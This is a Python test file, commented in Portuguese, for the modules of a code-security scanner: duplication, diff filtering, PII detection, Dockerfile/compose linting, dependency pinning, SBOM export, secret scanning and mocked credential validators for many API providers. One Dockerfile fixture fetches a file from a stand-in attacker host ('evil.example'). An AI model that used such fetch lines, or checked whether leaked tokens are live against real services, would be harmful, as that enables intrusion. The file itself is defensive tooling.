"""
Testes de unidade para módulos de apoio previamente sem cobertura direta:
duplication, diff, pii, container_security, trend, hash_pinning, sbom,
binary_scan e credential_validators.

Todos os testes afirmam comportamento observável (não são smoke tests). Os
validadores de credencial que exigem rede são exercitados com urlopen mockado
— nenhum teste faz chamada de rede real.
"""

from __future__ import annotations

import json
from types import SimpleNamespace

import pytest

# ══════════════════════════════════════════════════════════════════════════════
#  duplication
# ══════════════════════════════════════════════════════════════════════════════
from analyzer.duplication import (
    _hash8,
    _meaningful,
    _normalize,
    scan_duplication,
)


def test_normalize_masks_strings_and_numbers():
    # Strings viram "S" e números viram N → linhas equivalentes normalizam igual
    assert _normalize('x = "hello" + 42') == _normalize('x = "world" + 99')
    assert _normalize("  A  =  B  ") == "a = b"


def test_meaningful_filters_noise():
    assert _meaningful("   ") is False
    assert _meaningful("}") is False
    assert _meaningful("# comentário aqui") is False
    assert _meaningful("a = b + c") is True


def test_hash8_is_stable_and_short():
    h = _hash8("conteudo")
    assert len(h) == 8 and h == _hash8("conteudo")


def test_scan_duplication_detects_repeated_block():
    block = [
        "    total = compute_value(alpha, beta, gamma)",
        "    result = transform(total, scaling_factor)",
        "    persist_to_storage(result, connection)",
        "    emit_log_event(context, severity_level)",
        "    return final_result_object",
    ]
    code = "\n".join(["def foo():", *block, "value_between_blocks = 123456", "def bar():", *block])
    findings = scan_duplication("x.py", code)
    assert findings, "deveria detectar bloco duplicado"
    assert findings[0].lines_duplicated >= 5
    assert findings[0].file_path == "x.py"


def test_scan_duplication_no_false_positive_unique_code():
    code = "\n".join(f"unique_call_{i}(argument_{i}, other_{i})" for i in range(20))
    assert scan_duplication("x.py", code) == []


# ══════════════════════════════════════════════════════════════════════════════
#  diff
# ══════════════════════════════════════════════════════════════════════════════
from analyzer.diff import (
    diff_only_lines,
    filter_vulns_to_diff,
    parse_unified_diff,
)

_DIFF = """diff --git a/foo.py b/foo.py
--- a/foo.py
+++ b/foo.py
@@ -1,3 +1,4 @@
 line1
+added_line
 line2
-removed
+another
"""


def test_parse_unified_diff_added_and_removed():
    chunks = parse_unified_diff(_DIFF)
    assert "foo.py" in chunks
    assert chunks["foo.py"].added_lines == {2, 4}
    assert chunks["foo.py"].removed_lines == {4}


def test_diff_only_lines_matches_by_suffix_and_missing():
    chunks = parse_unified_diff(_DIFF)
    assert diff_only_lines("src/foo.py", chunks) == {2, 4}
    assert diff_only_lines("bar.py", chunks) is None


def test_filter_vulns_to_diff():
    chunks = parse_unified_diff(_DIFF)
    vulns = [
        SimpleNamespace(file_path="foo.py", line_number=2),  # em linha adicionada → mantém
        SimpleNamespace(file_path="foo.py", line_number=99),  # fora do diff → descarta
        SimpleNamespace(file_path="other.py", line_number=1),  # arquivo fora do diff → mantém
    ]
    kept = filter_vulns_to_diff(vulns, chunks)
    assert len(kept) == 2
    assert SimpleNamespace(file_path="foo.py", line_number=99) not in kept


# ══════════════════════════════════════════════════════════════════════════════
#  pii
# ══════════════════════════════════════════════════════════════════════════════
from analyzer.pii import _luhn, _mask, scan_pii


def test_luhn_and_mask():
    assert _luhn("4111111111111111") is True
    assert _luhn("4111111111111112") is False
    assert _mask("4111111111111111") == "4111********1111"
    assert _mask("123") == "***"


def test_scan_pii_detects_valid_cpf_cnpj_card():
    content = "\n".join(
        [
            'cpf = "111.444.777-35"',
            'cnpj = "11.222.333/0001-81"',
            'card = "4111 1111 1111 1111"',
        ]
    )
    types = {f.pii_type for f in scan_pii("x.py", content)}
    assert "CPF" in types
    assert "CNPJ" in types
    assert "CartaoCredito" in types


def test_scan_pii_ignores_comments_and_invalid():
    content = "\n".join(
        [
            '# cpf = "111.444.777-35"',  # comentário → ignorado
            'cpf = "000.000.000-00"',  # inválido (todos iguais) → ignorado
        ]
    )
    assert scan_pii("x.py", content) == []


def test_scan_pii_email_and_phone():
    content = "\n".join(
        [
            'contato = "joao.silva@empresa.com.br"',
            'telefone = "(11) 98765-4321"',
        ]
    )
    types = {f.pii_type for f in scan_pii("x.py", content)}
    assert "Email" in types
    assert "TelefoneBR" in types


# ══════════════════════════════════════════════════════════════════════════════
#  container_security
# ══════════════════════════════════════════════════════════════════════════════
from analyzer.container_security import scan_compose, scan_dockerfile


def test_scan_dockerfile_flags_all_bad_practices():
    docker = "\n".join(
        [
            "FROM python:latest",
            "ADD http://evil.example/x /x",
            "COPY .env /app/",
            "RUN apt-get install -y curl",
        ]
    )
    ids = {f["rule_id"] for f in scan_dockerfile(docker)}
    assert {"DOCKER-BP-001", "DOCKER-BP-002", "DOCKER-BP-003", "DOCKER-BP-004", "DOCKER-BP-005"} <= ids


def test_scan_dockerfile_clean_has_no_root_finding():
    docker = "FROM python:3.11-slim\nUSER appuser\n"
    ids = {f["rule_id"] for f in scan_dockerfile(docker)}
    assert "DOCKER-BP-005" not in ids


def test_scan_compose_dict():
    doc = {"services": {"web": {"privileged": True, "network_mode": "host"}, "db": {"read_only": True}}}
    ids = {f["rule_id"] for f in scan_compose(doc)}
    assert {"COMPOSE-001", "COMPOSE-002", "COMPOSE-003"} <= ids


def test_scan_compose_yaml_string():
    yaml = "services:\n  web:\n    privileged: true\n"
    ids = {f["rule_id"] for f in scan_compose(yaml)}
    assert "COMPOSE-001" in ids


# ══════════════════════════════════════════════════════════════════════════════
#  trend
# ══════════════════════════════════════════════════════════════════════════════
from analyzer.models import ScanReport
from analyzer.trend import TrendDB, ascii_trend


def _report(target="proj", total=10):
    return ScanReport(
        results=[],
        total_time=1.5,
        files_scanned=5,
        files_with_issues=2,
        total_vulnerabilities=total,
        critical_count=1,
        high_count=2,
        medium_count=3,
        low_count=4,
        info_count=0,
        target=target,
    )


def test_trenddb_record_history_delete_clear(tmp_path):
    db = TrendDB(str(tmp_path / "trend.db"))
    rid = db.record(_report(total=7))
    assert isinstance(rid, int)
    hist = db.history()
    assert len(hist) == 1
    assert hist[0].total_vulns == 7 and hist[0].target == "proj"
    assert "/" in hist[0].dt  # formato "dd/mm HH:MM"

    db.record(_report(total=3))
    assert len(db.history()) == 2
    db.delete(rid)
    assert len(db.history()) == 1
    db.clear()
    assert db.history() == []


def test_ascii_trend_empty_and_populated(tmp_path):
    assert "sem histórico" in ascii_trend([])
    db = TrendDB(str(tmp_path / "t.db"))
    db.record(_report(total=1))
    db.record(_report(total=9))
    chart = ascii_trend(db.history())
    assert "█" in chart


# ══════════════════════════════════════════════════════════════════════════════
#  hash_pinning
# ══════════════════════════════════════════════════════════════════════════════
from analyzer.hash_pinning import (
    check_cargo_lock_checksums,
    check_package_lock_integrity,
    check_requirements_pinning,
    scan_pinning,
)


def test_check_requirements_pinning():
    content = "\n".join(
        [
            "requests>=2.0",
            "flask==2.1.0",
            "django==4.0 --hash=sha256:" + "a" * 64,
            "# comment",
            "-r other.txt",
        ]
    )
    issues = {(f.package, f.issue) for f in check_requirements_pinning(content)}
    assert ("requests", "versao_nao_fixada") in issues
    assert ("flask", "sem_hash") in issues
    assert not any(pkg == "django" for pkg, _ in issues)


def test_check_package_lock_integrity():
    lock = json.dumps(
        {
            "packages": {
                "": {},
                "node_modules/left-pad": {"version": "1.0.0"},
                "node_modules/ok": {"integrity": "sha512-xyz"},
            }
        }
    )
    pkgs = {f.package for f in check_package_lock_integrity(lock)}
    assert "left-pad" in pkgs
    assert "ok" not in pkgs


def test_check_package_lock_invalid_json():
    assert check_package_lock_integrity("{not json") == []


def test_check_cargo_lock_checksums():
    cargo = (
        '[[package]]\nname = "serde"\nversion = "1.0"\n'
        'source = "registry+https://github.com/rust-lang/crates.io-index"\n\n'
        '[[package]]\nname = "localdep"\nversion = "0.1"\n'
    )
    pkgs = {f.package for f in check_cargo_lock_checksums(cargo)}
    assert "serde" in pkgs  # tem source, sem checksum
    assert "localdep" not in pkgs  # sem source → dependência local legítima


def test_scan_pinning_directory(tmp_path):
    (tmp_path / "requirements.txt").write_text("requests>=2.0\n", encoding="utf-8")
    findings = scan_pinning(str(tmp_path))
    assert any(f.package == "requests" for f in findings)
    assert findings[0].file_path.endswith("requirements.txt")


# ══════════════════════════════════════════════════════════════════════════════
#  sbom
# ══════════════════════════════════════════════════════════════════════════════
from analyzer.sbom import (
    _from_cargo_toml,
    _from_csproj,
    _from_go_mod,
    _from_package_json,
    _from_pom_xml,
    _from_requirements,
    collect_components,
    export_cyclonedx,
    export_spdx,
)


def test_sbom_requirements_parser():
    comps = _from_requirements("requests==2.28.0\nflask>=2.0\n# c\n")
    names = {c.name for c in comps}
    assert {"requests", "flask"} <= names
    assert any(c.purl == "pkg:pypi/requests@2.28.0" for c in comps)


def test_sbom_package_json_parser():
    pj = json.dumps({"dependencies": {"react": "^18.2.0"}, "devDependencies": {"jest": "29.0.0"}})
    comps = {c.name: c.version for c in _from_package_json(pj)}
    assert comps["react"] == "18.2.0"
    assert comps["jest"] == "29.0.0"


def test_sbom_pom_cargo_go_csproj_parsers():
    pom = "<dependency><groupId>org.apache</groupId><artifactId>commons</artifactId><version>1.2</version></dependency>"
    assert _from_pom_xml(pom)[0].version == "1.2"

    cargo = '[dependencies]\nserde = "1.0.130"\n[other]\nx = "9"\n'
    cargo_names = {c.name for c in _from_cargo_toml(cargo)}
    assert "serde" in cargo_names and "x" not in cargo_names

    gomod = "module x\n\nrequire github.com/pkg/errors v0.9.1\n"
    assert any(c.name == "github.com/pkg/errors" for c in _from_go_mod(gomod))

    csproj = '<PackageReference Include="Newtonsoft.Json" Version="13.0.1" />'
    assert _from_csproj(csproj)[0].name == "Newtonsoft.Json"


def test_sbom_collect_and_export(tmp_path):
    (tmp_path / "requirements.txt").write_text("requests==2.28.0\n", encoding="utf-8")
    comps = collect_components(str(tmp_path))
    assert comps

    cdx = tmp_path / "bom.json"
    export_cyclonedx(comps, str(cdx), project_name="demo")
    data = json.loads(cdx.read_text(encoding="utf-8"))
    assert data["bomFormat"] == "CycloneDX"
    assert data["components"][0]["name"] == "requests"

    spdx = tmp_path / "bom.spdx"
    export_spdx(comps, str(spdx), project_name="demo")
    text = spdx.read_text(encoding="utf-8")
    assert "SPDXVersion: SPDX-2.3" in text
    assert "PackageName: requests" in text


# ══════════════════════════════════════════════════════════════════════════════
#  binary_scan
# ══════════════════════════════════════════════════════════════════════════════
import zlib

from analyzer.binary_scan import (
    extract_exif_strings,
    extract_pdf_text,
    extract_strings,
    parse_env_file,
    scan_env_for_secrets,
    scan_non_text_file,
)


def test_extract_strings_ascii_and_utf16():
    data = b"\x00\x01hello world\x00\xff" + ("password".encode("utf-16le"))
    strings = extract_strings(data)
    assert any("hello world" in s for s in strings)
    assert any("password" in s for s in strings)


def test_extract_pdf_text_literal_and_flate_stream():
    literal = b"%PDF-1.4\n(PlainVisible secret)\n"
    compressed = zlib.compress(b"(CompressedText apikey)")
    pdf = literal + b"stream\n" + compressed + b"endstream"
    text = extract_pdf_text(pdf)
    assert "PlainVisible" in text
    assert "CompressedText" in text


def test_extract_exif_strings_non_jpeg_returns_empty():
    assert extract_exif_strings(b"not a jpeg at all") == []


def test_parse_env_file():
    content = 'API_PASSWORD=supersecret123\n# c\nEMPTY=\nexport TOKEN="abcdefgh"\n'
    parsed = parse_env_file(content)
    keys = {k for _, k, _ in parsed}
    assert {"API_PASSWORD", "EMPTY", "TOKEN"} <= keys
    assert ("supersecret123") in [v for _, _, v in parsed]


def test_scan_env_for_secrets_generic_heuristic():
    content = "DB_PASSWORD=supersecret123\nAPI_TOKEN=abcdefgh\nPLAIN=hi\n"
    findings = scan_env_for_secrets(".env", content)
    # DB_PASSWORD e API_TOKEN têm nome sensível + valor >= 8 chars
    assert len(findings) >= 2
    assert any("sensível" in f["secret_type"] for f in findings)


def test_scan_non_text_file_env(tmp_path):
    env = tmp_path / ".env"
    env.write_text("SECRET_KEY=longenoughvalue123\n", encoding="utf-8")
    findings = scan_non_text_file(str(env))
    assert any(f["source"] == "env" for f in findings)


def test_scan_non_text_file_unknown_extension(tmp_path):
    f = tmp_path / "notes.txt"
    f.write_text("nothing here", encoding="utf-8")
    assert scan_non_text_file(str(f)) == []


# ══════════════════════════════════════════════════════════════════════════════
#  credential_validators (urlopen mockado — sem rede real)
# ══════════════════════════════════════════════════════════════════════════════
import analyzer.credential_validators as cv


class _FakeResp:
    status = 200

    def __init__(self, body=b'{"ok": true}'):
        self._body = body

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False

    def read(self):
        return self._body


def _patch_ok(monkeypatch):
    monkeypatch.setattr(cv.urllib.request, "urlopen", lambda req, timeout=None: _FakeResp())


def _patch_http_error(monkeypatch, code):
    def boom(req, timeout=None):
        raise cv.urllib.error.HTTPError("http://x", code, "e", {}, None)

    monkeypatch.setattr(cv.urllib.request, "urlopen", boom)


def test_validate_valid(monkeypatch):
    _patch_ok(monkeypatch)
    r = cv.validate_github_token("tok")
    assert r.status == "VALID" and r.provider == "GitHub"


def test_validate_invalid_401(monkeypatch):
    _patch_http_error(monkeypatch, 401)
    r = cv.validate_stripe_key("tok")
    assert r.status == "INVALID" and r.provider == "Stripe"


def test_validate_unknown_500(monkeypatch):
    _patch_http_error(monkeypatch, 500)
    assert cv.validate_openai_key("tok").status == "UNKNOWN"


def test_validate_network_error(monkeypatch):
    def boom(req, timeout=None):
        raise OSError("down")

    monkeypatch.setattr(cv.urllib.request, "urlopen", boom)
    assert cv.validate_npm_token("tok").status == "UNKNOWN"


def test_validate_slack_ok(monkeypatch):
    _patch_ok(monkeypatch)
    assert cv.validate_slack_token("tok").status == "VALID"


def test_validate_slack_network_error(monkeypatch):
    def boom(req, timeout=None):
        raise OSError("down")

    monkeypatch.setattr(cv.urllib.request, "urlopen", boom)
    assert cv.validate_slack_token("tok").status == "UNKNOWN"


@pytest.mark.parametrize(
    "fn",
    [
        cv.validate_sendgrid_key,
        cv.validate_gitlab_token,
        cv.validate_discord_bot_token,
        cv.validate_telegram_bot_token,
        cv.validate_digitalocean_token,
        cv.validate_cloudflare_token,
        cv.validate_huggingface_token,
        cv.validate_notion_token,
        cv.validate_vercel_token,
        cv.validate_netlify_token,
        cv.validate_pagerduty_token,
        cv.validate_datadog_key,
        cv.validate_airtable_token,
        cv.validate_groq_key,
        cv.validate_mistral_key,
        cv.validate_figma_token,
        cv.validate_linode_token,
        cv.validate_stripe_key,
        cv.validate_mailgun_key,
    ],
)
def test_all_single_arg_validators_route(monkeypatch, fn):
    _patch_ok(monkeypatch)
    result = fn("some-token")
    assert result.status == "VALID"
    assert result.provider  # provider preenchido


def test_validate_twilio(monkeypatch):
    _patch_ok(monkeypatch)
    r = cv.validate_twilio_credentials("ACsid", "authtoken")
    assert r.provider == "Twilio" and r.status == "VALID"


def test_build_sigv4_headers():
    h = cv.build_sigv4_headers("AKIAEXAMPLE", "secretkey")
    assert "AWS4-HMAC-SHA256" in h["Authorization"]
    assert h["Host"] == "sts.amazonaws.com"
    assert "x-amz-date" in h
    assert "x-amz-security-token" not in h

    h2 = cv.build_sigv4_headers("AKIAEXAMPLE", "secretkey", session_token="tok123")
    assert h2["x-amz-security-token"] == "tok123"
    assert "x-amz-security-token" in h2["Authorization"]


def test_validate_by_provider_dispatch(monkeypatch):
    assert cv.validate_by_provider("NonexistentProvider", "x") is None
    assert cv.validate_by_provider("AWS", "x") is None  # AWS exige 2 campos
    _patch_ok(monkeypatch)
    routed = cv.validate_by_provider("GitHub", "tok")
    assert routed is not None and routed.status == "VALID"
